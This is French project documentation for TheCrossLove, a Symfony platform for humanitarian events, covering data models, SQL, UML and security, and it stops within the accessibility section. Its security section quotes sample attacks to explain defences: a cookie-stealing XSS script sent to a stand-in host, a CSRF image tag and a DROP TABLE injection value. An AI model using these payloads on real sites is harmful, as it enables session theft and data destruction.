# TheCrossLove - Documentation Technique Complete

> **Document destine aux jurys CDA (Concepteur Developpeur d'Applications)**
> Ce document presente l'ensemble du projet TheCrossLove avec des explications pedagogiques
> adaptees a un developpeur debutant devant justifier et defendre ses choix techniques.
>
> **Structure alignee sur les criteres d'evaluation du jury CDA**

---

## TABLE DES MATIERES

### PARTIE A - CRITERES D'EVALUATION DU JURY
1. [Cahier des Charges](#1-cahier-des-charges)
2. [Gestion de Projet](#2-gestion-de-projet)
3. [Referencement SEO](#3-referencement-seo)
4. [Conception UI/UX](#4-conception-uiux)
5. [Modelisation MERISE](#5-modelisation-merise)
6. [Requetes SQL et Jointures](#6-requetes-sql-et-jointures)
7. [Modelisation UML](#7-modelisation-uml)
8. [Securite (XSS, CSRF, SQL, Hashage, MdP)](#8-securite-xss-csrf-sql-hashage-mdp)
9. [RGAA (Accessibilite)](#9-rgaa-accessibilite)
10. [RGPD (Protection des Donnees)](#10-rgpd-protection-des-donnees)
11. [Demonstration de l'Application](#11-demonstration-de-lapplication)
12. [DevOps (CI/CD)](#12-devops-cicd)
13. [Politique de Test](#13-politique-de-test)
14. [Veille Technologique et Securite](#14-veille-technologique-et-securite)

### PARTIE B - DOCUMENTATION TECHNIQUE DETAILLEE
15. [Architecture MVC](#15-architecture-mvc)
16. [Structure du Code](#16-structure-du-code)
17. [Entites et Relations](#17-entites-et-relations)
18. [Controllers et Routes](#18-controllers-et-routes)
19. [Formulaires Symfony](#19-formulaires-symfony)
20. [Templates Twig](#20-templates-twig)
21. [Migrations](#21-migrations)
22. [Configuration Docker et phpMyAdmin](#22-configuration-docker-et-phpmyadmin)
23. [Glossaire](#23-glossaire)
24. [Questions du Jury et Reponses Types](#24-questions-du-jury-et-reponses-types)

---

# PARTIE A - CRITERES D'EVALUATION DU JURY

---

# 1. CAHIER DES CHARGES

## 1.1 Contexte du Projet

**Nom du projet** : TheCrossLove
**Type** : Plateforme web de gestion d'evenements humanitaires
**Client cible** : Association humanitaire intervenant au Senegal et en RDC

## 1.2 Problematique

L'association TheCrossLove organise des evenements humanitaires (sensibilisation, ateliers, conferences) dans plusieurs pays. Elle a besoin d'un outil pour :
- Centraliser la gestion des evenements
- Permettre aux benevoles de s'inscrire en ligne
- Suivre les inscriptions et la capacite des evenements
- Gerer les droits d'acces (utilisateurs vs administrateurs)

## 1.3 Objectifs du Projet

| Objectif | Description | Priorite |
|----------|-------------|----------|
| Gestion des evenements | CRUD complet (Create, Read, Update, Delete) | Haute |
| Inscription en ligne | Formulaire d'inscription securise | Haute |
| Authentification | Connexion/inscription utilisateur | Haute |
| Administration | Tableau de bord avec statistiques | Haute |
| Responsive | Compatible mobile/tablette | Moyenne |
| Accessibilite | Conforme RGAA niveau AA | Moyenne |

## 1.4 Perimetre Fonctionnel

### Fonctionnalites Utilisateur (ROLE_USER)
- Consulter la liste des evenements
- Voir le detail d'un evenement
- S'inscrire a un evenement (si places disponibles)
- Consulter ses inscriptions
- Modifier son profil

### Fonctionnalites Administrateur (ROLE_ADMIN)
- Toutes les fonctionnalites utilisateur
- Creer/modifier/supprimer des evenements
- Gerer les categories
- Voir la liste des participants par evenement
- Acceder aux statistiques du tableau de bord

## 1.5 Contraintes Techniques

| Contrainte | Specification |
|------------|---------------|
| Langage backend | PHP 8.2+ |
| Framework | Symfony 7.3 |
| Base de donnees | MySQL 8.0 / MariaDB 11.5 |
| Frontend | Twig + Bootstrap 5.3 |
| Securite | OWASP Top 10, RGPD |
| Deploiement | Docker, CI/CD |

## 1.6 Livrables

1. Code source versionne (Git)
2. Base de donnees avec migrations
3. Documentation technique
4. Tests unitaires et fonctionnels
5. Configuration Docker (dev + prod)

---

# 2. GESTION DE PROJET

## 2.1 Methodologie Utilisee

**Methode Agile (Scrum simplifie)**

| Element | Application dans le projet |
|---------|---------------------------|
| **Sprints** | Cycles de 2 semaines |
| **User Stories** | Fonctionnalites decrites du point de vue utilisateur |
| **Backlog** | Liste priorisee des fonctionnalites |
| **Definition of Done** | Tests passes, code revise, documente |

## 2.2 Outils de Gestion

| Outil | Usage |
|-------|-------|
| **Git** | Versioning du code |
| **GitHub** | Hebergement du repository, Issues, Pull Requests |
| **Trello/Notion** | Gestion du backlog et des taches |
| **Composer** | Gestion des dependances PHP |
| **Docker** | Environnement de developpement |

## 2.3 Organisation du Code (Git Flow)

```
main (production)
  |
  +-- develop (developpement)
        |
        +-- feature/authentification
        +-- feature/gestion-evenements
        +-- feature/inscriptions
        +-- fix/correction-bug-xyz
```

### Conventions de Commit

```
feat: Ajout de la fonctionnalite d'inscription
fix: Correction du bug d'affichage des dates
docs: Mise a jour de la documentation
test: Ajout des tests unitaires pour Event
refactor: Reorganisation du code du controller
```

## 2.4 Planning Previsionnel

| Sprint | Fonctionnalites | Duree |
|--------|-----------------|-------|
| Sprint 1 | Architecture, BDD, Entites | 2 semaines |
| Sprint 2 | Authentification, Securite | 2 semaines |
| Sprint 3 | CRUD Evenements, Admin | 2 semaines |
| Sprint 4 | Inscriptions, UX | 2 semaines |
| Sprint 5 | Tests, Documentation | 2 semaines |
| Sprint 6 | Deploiement, CI/CD | 1 semaine |

## 2.5 Suivi des Risques

| Risque | Impact | Probabilite | Mitigation |
|--------|--------|-------------|------------|
| Retard developpement | Moyen | Moyenne | Priorisation des fonctionnalites essentielles |
| Failles de securite | Eleve | Faible | Tests de securite, code review |
| Incompatibilite technique | Moyen | Faible | Containerisation Docker |

---

# 3. REFERENCEMENT SEO

## 3.1 Optimisations SEO Implementees

### Structure HTML Semantique

```html
<!-- templates/base.html.twig -->
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="{% block meta_description %}TheCrossLove - Plateforme d'evenements humanitaires{% endblock %}">
    <meta name="robots" content="index, follow">
    <title>{% block title %}TheCrossLove{% endblock %}</title>

    <!-- Open Graph pour reseaux sociaux -->
    <meta property="og:title" content="{% block og_title %}TheCrossLove{% endblock %}">
    <meta property="og:description" content="{% block og_description %}Evenements humanitaires{% endblock %}">
    <meta property="og:type" content="website">
    <meta property="og:url" content="{{ app.request.uri }}">
</head>
<body>
    <header role="banner">
        <nav role="navigation" aria-label="Navigation principale">...</nav>
    </header>

    <main role="main">
        {% block body %}{% endblock %}
    </main>

    <footer role="contentinfo">...</footer>
</body>
</html>
```

### URLs Propres (Slugs)

```php
// Entite Event avec slug auto-genere
#[ORM\Column(length: 255, unique: true)]
private ?string $slug = null;

// URL : /event/conference-protection-enfants-2025 (au lieu de /event/123)
public function computeSlug(SluggerInterface $slugger): void
{
    if (!$this->slug) {
        $this->slug = strtolower($slugger->slug($this->title . '-' . $this->id));
    }
}
```

### Balises Heading Hierarchisees

```twig
{# Structure correcte des headings #}
<h1>{{ event.title }}</h1>
    <h2>Description de l'evenement</h2>
        <p>{{ event.description }}</p>
    <h2>Informations pratiques</h2>
        <h3>Lieu</h3>
        <h3>Date et horaire</h3>
    <h2>Inscription</h2>
```

## 3.2 Checklist SEO

| Critere | Implementation | Statut |
|---------|---------------|--------|
| Balise `<title>` unique par page | `{% block title %}` | OK |
| Meta description | `{% block meta_description %}` | OK |
| URLs lisibles (slugs) | Entites avec slug | OK |
| Hierarchie des headings | H1 > H2 > H3 | OK |
| Attributs alt sur images | `alt="{{ event.title }}"` | OK |
| Sitemap XML | A implementer | TODO |
| robots.txt | A implementer | TODO |
| HTTPS | Traefik + Let's Encrypt | OK |
| Performance (Core Web Vitals) | Bootstrap optimise | OK |

---

# 4. CONCEPTION UI/UX

## 4.1 Principes de Design Appliques

### Hierarchie Visuelle
- Titres clairs et distincts
- Boutons d'action bien visibles
- Espacement coherent (Bootstrap spacing)

### Navigation Intuitive
- Menu principal fixe en haut
- Fil d'Ariane (breadcrumb) sur les pages interieures
- Boutons de retour explicites

### Feedback Utilisateur
- Messages flash (succes, erreur, info)
- Etats des boutons (hover, disabled)
- Indicateurs de chargement

## 4.2 Charte Graphique

| Element | Valeur | Usage |
|---------|--------|-------|
| Couleur primaire | #0d6efd (Bootstrap primary) | Boutons, liens |
| Couleur succes | #198754 (Bootstrap success) | Confirmations |
| Couleur danger | #dc3545 (Bootstrap danger) | Erreurs, suppressions |
| Police | System fonts (Bootstrap) | Lisibilite optimale |

## 4.3 Responsive Design

```css
/* Bootstrap breakpoints utilises */
/* xs: 0px     - Smartphones portrait */
/* sm: 576px  - Smartphones paysage */
/* md: 768px  - Tablettes */
/* lg: 992px  - Desktops */
/* xl: 1200px - Grands ecrans */
```

### Grille Responsive

```twig
<div class="row">
    {# 1 colonne mobile, 2 tablette, 3 desktop #}
    {% for event in events %}
        <div class="col-12 col-md-6 col-lg-4 mb-4">
            {% include 'event/_card.html.twig' %}
        </div>
    {% endfor %}
</div>
```

## 4.4 Wireframes Principaux

### Page d'accueil
```
+----------------------------------+
|  LOGO    [Nav]     [Login]       |
+----------------------------------+
|                                  |
|    HERO : Bienvenue sur          |
|    TheCrossLove                  |
|                                  |
+----------------------------------+
|  [Event 1]  [Event 2]  [Event 3] |
|  [Event 4]  [Event 5]  [Event 6] |
+----------------------------------+
|           FOOTER                 |
+----------------------------------+
```

### Page detail evenement
```
+----------------------------------+
|  LOGO    [Nav]     [User]        |
+----------------------------------+
| < Retour                         |
+----------------------------------+
| [IMAGE]  |  Titre                |
|          |  Date, Lieu           |
|          |  Places: 12/50        |
|          |  [S'INSCRIRE]         |
+----------------------------------+
|  Description complete            |
|  ...                             |
+----------------------------------+
```

---

# 5. MODELISATION MERISE

## 5.1 Dictionnaire de Donnees

### Table USER

| Attribut | Type | Taille | Contraintes | Description |
|----------|------|--------|-------------|-------------|
| id_user | INT | - | PK, AUTO_INCREMENT | Identifiant unique |
| email | VARCHAR | 180 | UNIQUE, NOT NULL | Adresse email (login) |
| roles | JSON | - | NOT NULL | Roles utilisateur |
| password | VARCHAR | 255 | NOT NULL | Mot de passe hashe |
| first_name | VARCHAR | 100 | NOT NULL | Prenom |
| last_name | VARCHAR | 100 | NOT NULL | Nom |
| creation_user | DATETIME | - | NOT NULL | Date de creation |

### Table EVENT

| Attribut | Type | Taille | Contraintes | Description |
|----------|------|--------|-------------|-------------|
| id_event | INT | - | PK, AUTO_INCREMENT | Identifiant unique |
| id_user | INT | - | FK, NOT NULL | Createur de l'evenement |
| id_category | INT | - | FK, NULL | Categorie |
| title | VARCHAR | 160 | NOT NULL | Titre |
| slug | VARCHAR | 255 | UNIQUE | URL lisible |
| description | TEXT | - | NOT NULL | Description complete |
| image | VARCHAR | 255 | NULL | Nom du fichier image |
| date_start | DATETIME | - | NOT NULL | Date/heure de debut |
| date_end | DATETIME | - | NOT NULL | Date/heure de fin |
| address | VARCHAR | 160 | NOT NULL | Adresse |
| postal_code | VARCHAR | 10 | NOT NULL | Code postal |
| city | VARCHAR | 100 | NOT NULL | Ville |
| country | VARCHAR | 100 | NOT NULL | Pays |
| organizer | VARCHAR | 160 | NOT NULL | Organisateur |
| max_participants | INT | - | NULL | Capacite max (null=illimite) |
| status | VARCHAR | 20 | NOT NULL, DEFAULT 'active' | Statut |
| created_at | DATETIME | - | NOT NULL | Date creation |
| updated_at | DATETIME | - | NULL | Date modification |

### Table CATEGORY

| Attribut | Type | Taille | Contraintes | Description |
|----------|------|--------|-------------|-------------|
| id_category | INT | - | PK, AUTO_INCREMENT | Identifiant unique |
| name | VARCHAR | 255 | NOT NULL, UNIQUE | Nom de la categorie |
| slug | VARCHAR | 255 | UNIQUE | URL lisible |

### Table TO_REGISTER

| Attribut | Type | Taille | Contraintes | Description |
|----------|------|--------|-------------|-------------|
| id_registration | INT | - | PK, AUTO_INCREMENT | Identifiant unique |
| id_user | INT | - | FK, NOT NULL | Utilisateur inscrit |
| id_event | INT | - | FK, NOT NULL, CASCADE | Evenement |
| registered_at | DATETIME | - | NOT NULL | Date inscription |
| status | VARCHAR | 20 | NOT NULL, DEFAULT 'confirmed' | Statut |
| whatsapp_number | VARCHAR | 20 | NULL | Numero WhatsApp |
| latitude | DECIMAL | 10,7 | NULL | Coordonnee GPS |
| longitude | DECIMAL | 10,7 | NULL | Coordonnee GPS |

## 5.2 Modele Conceptuel de Donnees (MCD)

```
+-------------+          +---------------+          +-------------+
|    USER     |          |   TO_REGISTER |          |    EVENT    |
+-------------+          +---------------+          +-------------+
| #id_user PK |---1,n----| #id_registr PK|----n,1---| #id_event PK|
| email       |          | id_user FK    |          | id_user FK  |---+
| roles       |          | id_event FK   |          | id_category |   |
| password    |          | registered_at |          | title       |   |
| first_name  |          | status        |          | slug        |   |
| last_name   |          | whatsapp_num  |          | description |   |
| creation    |          | latitude      |          | image       |   |
+-------------+          | longitude     |          | date_start  |   |
      |                  +---------------+          | date_end    |   |
      |                                             | address     |   |
      |                                             | city        |   |
      |                                             | status      |   |
      |                                             +-------------+   |
      |                                                    |          |
      |                                                    |n,1       |
      |                                             +-------------+   |
      |                                             |  CATEGORY   |   |
      |                                             +-------------+   |
      |                                             | #id_cat PK  |   |
      +---------------------------------------------| name        |---+
                        cree (1,n)                  | slug        |
                                                    +-------------+
```

## 5.3 Modele Logique de Donnees (MLD)

```
USER (id_user, email, roles, password, first_name, last_name, creation_user)
    PK: id_user
    UNIQUE: email

CATEGORY (id_category, name, slug)
    PK: id_category
    UNIQUE: name, slug

EVENT (id_event, #id_user, #id_category, title, slug, description, image,
       date_start, date_end, address, postal_code, city, country,
       organizer, max_participants, status, created_at, updated_at)
    PK: id_event
    FK: id_user REFERENCES USER(id_user)
    FK: id_category REFERENCES CATEGORY(id_category)
    UNIQUE: slug

TO_REGISTER (id_registration, #id_user, #id_event, registered_at, status,
             whatsapp_number, latitude, longitude, location_updated_at)
    PK: id_registration
    FK: id_user REFERENCES USER(id_user)
    FK: id_event REFERENCES EVENT(id_event) ON DELETE CASCADE
    UNIQUE: (id_user, id_event)
```

## 5.4 Regles de Gestion

| Code | Regle |
|------|-------|
| RG01 | Un utilisateur est identifie par un email unique |
| RG02 | Un utilisateur peut avoir plusieurs roles (USER, ADMIN) |
| RG03 | Un evenement est obligatoirement cree par un utilisateur |
| RG04 | Un evenement peut appartenir a une categorie (optionnel) |
| RG05 | Un utilisateur ne peut s'inscrire qu'une seule fois a un evenement |
| RG06 | La suppression d'un evenement entraine la suppression des inscriptions |
| RG07 | La date de fin doit etre superieure a la date de debut |
| RG08 | Le mot de passe est stocke hashe (bcrypt/argon2) |

---

# 6. REQUETES SQL ET JOINTURES

## 6.1 Requetes de Base (CRUD)

### CREATE - Insertion

```sql
-- Creer un nouvel utilisateur
INSERT INTO user (email, roles, password, first_name, last_name, creation_user)
VALUES ('john@example.com', '["ROLE_USER"]', '$2y$13$hashedpassword...',
        'John', 'Doe', NOW());

-- Creer un evenement
INSERT INTO event (id_user, id_category, title, slug, description,
                   date_start, date_end, address, postal_code, city,
                   country, organizer, status, created_at)
VALUES (1, 2, 'Conference Humanitaire', 'conference-humanitaire-1',
        'Description...', '2026-03-15 10:00:00', '2026-03-15 18:00:00',
        '123 Rue Example', '75001', 'Paris', 'France',
        'TheCrossLove', 'active', NOW());
```

### READ - Selection

```sql
-- Lire tous les evenements actifs a venir
SELECT * FROM event
WHERE status = 'active'
  AND date_start > NOW()
ORDER BY date_start ASC;

-- Lire un utilisateur par email
SELECT * FROM user WHERE email = 'john@example.com';
```

### UPDATE - Mise a jour

```sql
-- Mettre a jour le statut d'un evenement
UPDATE event
SET status = 'cancelled', updated_at = NOW()
WHERE id_event = 5;

-- Modifier le role d'un utilisateur
UPDATE user
SET roles = '["ROLE_USER", "ROLE_ADMIN"]'
WHERE id_user = 1;
```

### DELETE - Suppression

```sql
-- Supprimer une inscription
DELETE FROM to_register WHERE id_registration = 10;

-- Supprimer un evenement (CASCADE supprime les inscriptions)
DELETE FROM event WHERE id_event = 5;
```

## 6.2 Requetes avec Jointures

### INNER JOIN - Evenements avec leurs categories

```sql
-- Liste des evenements avec le nom de leur categorie
SELECT e.id_event, e.title, e.date_start, c.name AS category_name
FROM event e
INNER JOIN category c ON e.id_category = c.id_category
WHERE e.status = 'active'
ORDER BY e.date_start;
```

### LEFT JOIN - Tous les evenements (avec ou sans categorie)

```sql
-- Liste complete incluant les evenements sans categorie
SELECT e.id_event, e.title, e.date_start,
       COALESCE(c.name, 'Non categorise') AS category_name
FROM event e
LEFT JOIN category c ON e.id_category = c.id_category
WHERE e.status = 'active'
ORDER BY e.date_start;
```

### Jointure Multiple - Inscriptions avec details

```sql
-- Liste des inscriptions avec details utilisateur et evenement
SELECT
    tr.id_registration,
    tr.registered_at,
    tr.status AS registration_status,
    u.first_name,
    u.last_name,
    u.email,
    e.title AS event_title,
    e.date_start
FROM to_register tr
INNER JOIN user u ON tr.id_user = u.id_user
INNER JOIN event e ON tr.id_event = e.id_event
WHERE e.id_event = 5
ORDER BY tr.registered_at DESC;
```

## 6.3 Requetes Avancees

### Agregation - Comptage des participants

```sql
-- Nombre d'inscrits par evenement
SELECT
    e.id_event,
    e.title,
    e.max_participants,
    COUNT(tr.id_registration) AS participant_count,
    (e.max_participants - COUNT(tr.id_registration)) AS places_disponibles
FROM event e
LEFT JOIN to_register tr ON e.id_event = tr.id_event
GROUP BY e.id_event, e.title, e.max_participants
HAVING COUNT(tr.id_registration) < e.max_participants
    OR e.max_participants IS NULL
ORDER BY e.date_start;
```

### Sous-requete - Evenements complets

```sql
-- Evenements ayant atteint leur capacite maximale
SELECT e.*
FROM event e
WHERE e.max_participants IS NOT NULL
  AND e.max_participants <= (
      SELECT COUNT(*)
      FROM to_register tr
      WHERE tr.id_event = e.id_event
  );
```

### Recherche textuelle

```sql
-- Recherche dans titre et description
SELECT * FROM event
WHERE (title LIKE '%humanitaire%' OR description LIKE '%humanitaire%')
  AND status = 'active'
ORDER BY date_start;
```

## 6.4 Implementation Doctrine (ORM)

```php
// Les requetes SQL sont generees par Doctrine via le QueryBuilder

// Equivalent de la jointure multiple ci-dessus
$registrations = $this->createQueryBuilder('tr')
    ->select('tr', 'u', 'e')
    ->innerJoin('tr.user', 'u')
    ->innerJoin('tr.event', 'e')
    ->where('e.id = :eventId')
    ->setParameter('eventId', 5)
    ->orderBy('tr.registeredAt', 'DESC')
    ->getQuery()
    ->getResult();

// Recherche parametree (protegee contre injection SQL)
$events = $this->createQueryBuilder('e')
    ->where('e.title LIKE :search')
    ->orWhere('e.description LIKE :search')
    ->setParameter('search', '%' . $searchTerm . '%')
    ->getQuery()
    ->getResult();
```

---

# 7. MODELISATION UML

## 7.1 Diagramme de Cas d'Utilisation

```
                    +---------------------------+
                    |      TheCrossLove         |
                    +---------------------------+
                              |
        +---------------------+---------------------+
        |                                           |
   [Visiteur]                                  [Administrateur]
        |                                           |
        |  +------------------+                     |  +------------------+
        +->| Consulter liste  |                     +->| Gerer evenements |
        |  | evenements       |                     |  | (CRUD)           |
        |  +------------------+                     |  +------------------+
        |                                           |
        |  +------------------+                     |  +------------------+
        +->| Voir detail      |                     +->| Voir participants|
        |  | evenement        |                     |  +------------------+
        |  +------------------+                     |
        |                                           |  +------------------+
        |  +------------------+                     +->| Gerer categories |
        +->| S'inscrire       |                     |  +------------------+
           | (compte)         |                     |
           +------------------+                     |  +------------------+
                                                    +->| Dashboard stats  |
   [Utilisateur]                                       +------------------+
        |
        |  +------------------+
        +->| Se connecter     |
        |  +------------------+
        |
        |  +------------------+
        +->| S'inscrire a     |
        |  | un evenement     |
        |  +------------------+
        |
        |  +------------------+
        +->| Gerer son profil |
           +------------------+
```

## 7.2 Diagramme de Classes

```
+---------------------------+       +---------------------------+
|          User             |       |         Category          |
+---------------------------+       +---------------------------+
| - id: int                 |       | - id: int                 |
| - email: string           |       | - name: string            |
| - roles: array            |       | - slug: string            |
| - password: string        |       +---------------------------+
| - firstName: string       |       | + getEventCount(): int    |
| - lastName: string        |       +---------------------------+
| - creationUser: DateTime  |                    |
+---------------------------+                    | 0..1
| + getUserIdentifier()     |                    |
| + getRoles(): array       |                    |
| + hasRole(role): bool     |                    |
| + isAdmin(): bool         |       +---------------------------+
| + getFullName(): string   |       |          Event            |
+---------------------------+       +---------------------------+
         |                          | - id: int                 |
         | 1                        | - title: string           |
         |                          | - slug: string            |
         | cree                     | - description: string     |
         |                          | - image: string           |
         | *                        | - dateStart: DateTime     |
         v                          | - dateEnd: DateTime       |
+---------------------------+       | - address: string         |
|       ToRegister          |       | - city: string            |
+---------------------------+       | - maxParticipants: int    |
| - id: int                 |       | - status: string          |
| - registeredAt: DateTime  |       +---------------------------+
| - status: string          |       | + isUpcoming(): bool      |
| - whatsappNumber: string  |<------| + isPast(): bool          |
| - latitude: decimal       |   *   | + isOngoing(): bool       |
| - longitude: decimal      |       | + isFull(): bool          |
+---------------------------+       | + canRegister(): bool     |
| + hasLocation(): bool     |       | + getParticipantCount()   |
| + getStatusLabel(): string|       | + getAvailableSeats()     |
+---------------------------+       | + isUserRegistered(User)  |
         |                          +---------------------------+
         | *                                     |
         |                                       | *
         v                                       v
    [Utilisateur]                          [Createur]
```

## 7.3 Diagramme de Sequence - Inscription a un Evenement

```
Utilisateur      Controller        EventRepository    Event         ToRegisterRepo    EntityManager
    |                |                   |              |                |                |
    | GET /event/5   |                   |              |                |                |
    |--------------->|                   |              |                |                |
    |                | findById(5)       |              |                |                |
    |                |------------------>|              |                |                |
    |                |                   |------------->|                |                |
    |                |                   |   Event      |                |                |
    |                |<------------------|<-------------|                |                |
    |                |                   |              |                |                |
    |                | canRegister()?    |              |                |                |
    |                |------------------------------>---|                |                |
    |                |                   |     true     |                |                |
    |                |<------------------------------- -|                |                |
    |                |                   |              |                |                |
    | Page + Form    |                   |              |                |                |
    |<---------------|                   |              |                |                |
    |                |                   |              |                |                |
    | POST (submit)  |                   |              |                |                |
    |--------------->|                   |              |                |                |
    |                | validate form     |              |                |                |
    |                |----+              |              |                |                |
    |                |    |              |              |                |                |
    |                |<---+              |              |                |                |
    |                |                   |              |                |                |
    |                | new ToRegister()  |              |                |                |
    |                |----------------------------------------------->---|                |
    |                |                   |              |                |                |
    |                | persist()         |              |                |                |
    |                |-------------------------------------------------------------->---|
    |                |                   |              |                |                |
    |                | flush()           |              |                |                |
    |                |-------------------------------------------------------------->---|
    |                |                   |              |                |                |
    | Redirect + Flash                   |              |                |                |
    |<---------------|                   |              |                |                |
    |                |                   |              |                |                |
```

## 7.4 Diagramme d'Activite - Processus d'Inscription

```
            [Debut]
               |
               v
    +---------------------+
    | Afficher evenement  |
    +---------------------+
               |
               v
        /est connecte?\
       /               \
      Non              Oui
       |                |
       v                v
+-------------+   /peut s'inscrire?\
| Redirection |  /                  \
| vers login  | Non                 Oui
+-------------+  |                   |
       |         v                   v
       |   +-----------+    +------------------+
       |   | Message   |    | Afficher form    |
       |   | "Complet" |    | inscription      |
       |   +-----------+    +------------------+
       |         |                   |
       |         |                   v
       |         |          +------------------+
       |         |          | Soumettre form   |
       |         |          +------------------+
       |         |                   |
       |         |                   v
       |         |          /form valide?\
       |         |         /              \
       |         |        Non             Oui
       |         |         |               |
       |         |         v               v
       |         |   +-----------+  +------------------+
       |         |   | Afficher  |  | Creer            |
       |         |   | erreurs   |  | ToRegister       |
       |         |   +-----------+  +------------------+
       |         |         |               |
       |         |         |               v
       |         |         |        +------------------+
       |         |         |        | Sauvegarder BDD  |
       |         |         |        +------------------+
       |         |         |               |
       |         |         |               v
       |         |         |        +------------------+
       |         |         |        | Message succes   |
       |         |         |        +------------------+
       |         |         |               |
       +---------+---------+---------------+
                           |
                           v
                        [Fin]
```

---

# 8. SECURITE (XSS, CSRF, SQL, HASHAGE, MDP)

## 8.1 Protection XSS (Cross-Site Scripting)

### Qu'est-ce que XSS ?

**Attaque** : Injection de code JavaScript malveillant via les champs de formulaire.

**Exemple d'attaque** :
```html
<!-- L'attaquant entre dans un champ : -->
<script>document.location='https://hacker.com/steal?cookie='+document.cookie</script>
```

### Protection dans TheCrossLove

```twig
{# Twig echappe AUTOMATIQUEMENT toutes les variables #}
{{ user.name }}
{# Si user.name = "<script>alert('hack')</script>" #}
{# Affiche : &lt;script&gt;alert('hack')&lt;/script&gt; #}

{# DANGEREUX - A eviter sauf cas specifique #}
{{ content|raw }}  {# Desactive l'echappement #}
```

**Regle** : Ne JAMAIS utiliser `|raw` sur des donnees utilisateur.

---

## 8.2 Protection CSRF (Cross-Site Request Forgery)

### Qu'est-ce que CSRF ?

**Attaque** : Un site malveillant fait executer une action a l'insu de l'utilisateur connecte.

**Exemple d'attaque** :
```html
<!-- Sur un site malveillant -->
<img src="https://thecrosslove.com/admin/event/5/delete" />
<!-- Supprime l'evenement si l'admin est connecte ! -->
```

### Protection dans TheCrossLove

```twig
{# Template : Token CSRF cache dans le formulaire #}
<form method="post" action="{{ path('admin_event_delete', {id: event.id}) }}">
    <input type="hidden" name="_token" value="{{ csrf_token('delete' ~ event.id) }}">
    <button type="submit">Supprimer</button>
</form>
```

```php
// Controller : Verification du token
#[Route('/event/{id}/delete', methods: ['POST'])]
public function deleteEvent(Event $event, Request $request): Response
{
    // Le token doit correspondre sinon l'action est refusee
    if ($this->isCsrfTokenValid('delete'.$event->getId(), $request->get('_token'))) {
        $entityManager->remove($event);
        $entityManager->flush();
        $this->addFlash('success', 'Evenement supprime');
    } else {
        $this->addFlash('error', 'Action non autorisee');
    }

    return $this->redirectToRoute('admin_events');
}
```

**Configuration** :
```yaml
# config/packages/security.yaml
firewalls:
    main:
        form_login:
            enable_csrf: true  # Active la protection CSRF sur le login
```

---

## 8.3 Protection Injection SQL

### Qu'est-ce que l'injection SQL ?

**Attaque** : Insertion de code SQL malveillant via les champs de formulaire.

**Exemple d'attaque** :
```php
// CODE VULNERABLE (ne jamais faire ca !)
$email = $_POST['email'];  // Valeur: "'; DROP TABLE user; --"
$sql = "SELECT * FROM user WHERE email = '$email'";
// Resultat: SELECT * FROM user WHERE email = ''; DROP TABLE user; --'
// La table user est SUPPRIMEE !
```

### Protection dans TheCrossLove

```php
// Doctrine ORM utilise des requetes preparees (parametrees)

// Methode 1 : findBy (automatiquement securise)
$user = $userRepository->findOneBy(['email' => $email]);

// Methode 2 : QueryBuilder avec setParameter
$events = $this->createQueryBuilder('e')
    ->where('e.title LIKE :search')
    ->setParameter('search', '%' . $searchTerm . '%')  // PARAMETRE = SECURISE
    ->getQuery()
    ->getResult();

// Methode 3 : DQL avec parametre
$query = $entityManager->createQuery(
    'SELECT u FROM App\Entity\User u WHERE u.email = :email'
)->setParameter('email', $email);  // PARAMETRE = SECURISE
```

**Principe** : Doctrine **separe les donnees de la requete**. Les parametres sont toujours echappes.

---

## 8.4 Hashage des Mots de Passe

### Pourquoi hasher ?

- Un mot de passe en clair dans la BDD = catastrophe si fuite
- Le hashage est **irreversible** : impossible de retrouver le mot de passe original
- Meme si la BDD est volee, les mots de passe sont proteges

### Implementation dans TheCrossLove

```yaml
# config/packages/security.yaml
security:
    password_hashers:
        App\Entity\User:
            algorithm: auto  # Choisit automatiquement bcrypt ou argon2id
```

```php
// A l'inscription
public function register(
    Request $request,
    UserPasswordHasherInterface $passwordHasher
): Response {
    $user = new User();

    // Hashage du mot de passe (JAMAIS stocke en clair)
    $hashedPassword = $passwordHasher->hashPassword(
        $user,
        $form->get('plainPassword')->getData()
    );
    $user->setPassword($hashedPassword);

    // En BDD : $2y$13$N5gY8FwZQv3D... (hash bcrypt)
    // ou : $argon2id$v=19$m=65536... (hash argon2id)
}
```

### Verification a la connexion

```php
// Symfony verifie automatiquement via le security.yaml
// Le UserPasswordHasherInterface compare le mot de passe saisi
// avec le hash stocke en BDD
```

---

## 8.5 Politique de Mots de Passe

### Contraintes implementees

```php
// src/Form/RegistrationFormType.php
->add('plainPassword', PasswordType::class, [
    'constraints' => [
        new NotBlank(['message' => 'Mot de passe obligatoire']),
        new Length([
            'min' => 8,
            'minMessage' => 'Minimum {{ limit }} caracteres',
            'max' => 4096,  // Limite contre attaques DoS
        ]),
        // Optionnel : Regex pour complexite
        new Regex([
            'pattern' => '/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).+$/',
            'message' => 'Doit contenir majuscule, minuscule et chiffre'
        ])
    ],
])
```

### Recommandations ANSSI

| Critere | Minimum requis | TheCrossLove |
|---------|---------------|--------------|
| Longueur | 8 caracteres | 8 caracteres |
| Complexite | Recommande | Optionnel |
| Stockage | Hash bcrypt/argon2 | bcrypt/argon2 auto |
| Transmission | HTTPS | Oui (Traefik) |

---

## 8.6 Resume des Protections de Securite

| Vulnerabilite | Risque | Protection | Implementation |
|---------------|--------|------------|----------------|
| **XSS** | Vol de session, defacement | Echappement auto | Twig `{{ }}` |
| **CSRF** | Actions non autorisees | Token unique | `csrf_token()` |
| **SQL Injection** | Vol/destruction BDD | Requetes parametrees | Doctrine ORM |
| **Password Storage** | Vol de mots de passe | Hashage irreversible | bcrypt/argon2 |
| **Brute Force** | Decouverte MDP | Rate limiting | A implementer |
| **Session Hijacking** | Vol de session | Cookies securises | Symfony config |

---

# 9. RGAA (ACCESSIBILITE)

## 9.1 Qu'est-ce que le RGAA ?

Le **Referentiel General d'Amelioration de l'Accessibilite** est la norme francaise pour rendre les sites web accessibles aux personnes en situation de handicap.

**Objectif** : Niveau AA (42 criteres obligatoires)

## 9.2 Criteres Implementes dans TheCrossLove

### Images

```twig
{# Attribut alt obligatoire sur toutes les images #}
<img src="{{ asset('uploads/events/' ~ event.image) }}"
     alt="{{ event.title }} - Image de l'evenement"
     class="img-fluid">

{# Images decoratives : alt vide #}
<img src="{{ asset('images/decoration.png') }}" alt="" role="presentation">
```

### Formulaires

```twig
{# Labels associes aux champs #}
<label for="event_title" class="form-label">Titre de l'evenement *</label>
<input type="text" id="event_title" name="event[title]"
       class="form-control" required
       aria-describedby="title-help">
